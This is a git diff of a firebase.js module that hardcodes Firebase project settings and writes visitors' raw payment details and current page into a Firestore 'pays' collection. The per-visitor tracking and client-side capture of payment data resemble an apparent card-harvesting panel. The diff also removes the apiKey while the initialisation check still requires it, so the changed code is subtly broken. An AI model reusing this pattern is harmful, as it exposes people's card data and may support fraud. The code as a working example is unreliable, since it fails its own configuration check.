@@ -1,29 +1,30 @@
 // firebase.js
-import { getApp, getApps, initializeApp } from 'firebase/app';
-import { getDatabase } from 'firebase/database';
-import { doc, getFirestore, setDoc } from 'firebase/firestore';
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { doc, getFirestore, setDoc } from "firebase/firestore";
 
 const firebaseConfig = {
-  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
-  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
-  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL,
-  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
-  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
-  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
-  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
-  measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID
+  authDomain: "whaaa-6f64d.firebaseapp.com",
+  databaseURL: "https://whaaa-6f64d-default-rtdb.firebaseio.com",
+  projectId: "whaaa-6f64d",
+  storageBucket: "whaaa-6f64d.firebasestorage.app",
+  messagingSenderId: "828749821160",
+  appId: "1:828749821160:web:3b00b5446c8cd1722bc55d",
+  measurementId: "G-M45W939MHR",
 };
 
 function initializeFirebase() {
-  if (typeof window === 'undefined') {
+  if (typeof window === "undefined") {
     return null;
   }
-  
+
   if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
-    console.warn('Firebase configuration is incomplete. Some features may not work.');
+    console.warn(
+      "Firebase configuration is incomplete. Some features may not work.",
+    );
     return null;
   }
-  
+
   return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
 }
 
@@ -33,47 +34,51 @@ const database = app ? getDatabase(app) : null;
 
 export async function addData(data: any) {
   if (!db) {
-    console.warn('Firebase not initialized. Cannot add data.');
+    console.warn("Firebase not initialized. Cannot add data.");
     return;
   }
-  
-  localStorage.setItem('visitor', data.id);
-  try {
-    const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});
 
-    console.log('Document written with ID: ', docRef.id);
+  localStorage.setItem("visitor", data.id);
+  try {
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      { ...data, createdDate: new Date().toISOString() },
+      { merge: true },
+    );
+
+    console.log("Document written with ID: ", docRef.id);
     // You might want to show a success message to the user here
   } catch (e) {
-    console.error('Error adding document: ', e);
+    console.error("Error adding document: ", e);
     // You might want to show an error message to the user here
   }
 }
 
-export const handleCurrentPage=(page:string)=>{
-const visitorId=localStorage.getItem('visitor')
-addData({id:visitorId,currentPage:page})
-}
+export const handleCurrentPage = (page: string) => {
+  const visitorId = localStorage.getItem("visitor");
+  addData({ id: visitorId, currentPage: page });
+};
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   if (!db) {
-    console.warn('Firebase not initialized. Cannot process payment.');
+    console.warn("Firebase not initialized. Cannot process payment.");
     return;
   }
-  
+
   try {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const docRef = doc(db, 'pays', visitorId);
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...paymentInfo, status: 'pending' },
-        { merge: true }
+        { ...paymentInfo, status: "pending" },
+        { merge: true },
       );
-      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
   } catch (error) {
-    console.error('Error adding document: ', error);
-    alert('Error adding payment info to Firestore');
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
-export { db,database };
+export { db, database };
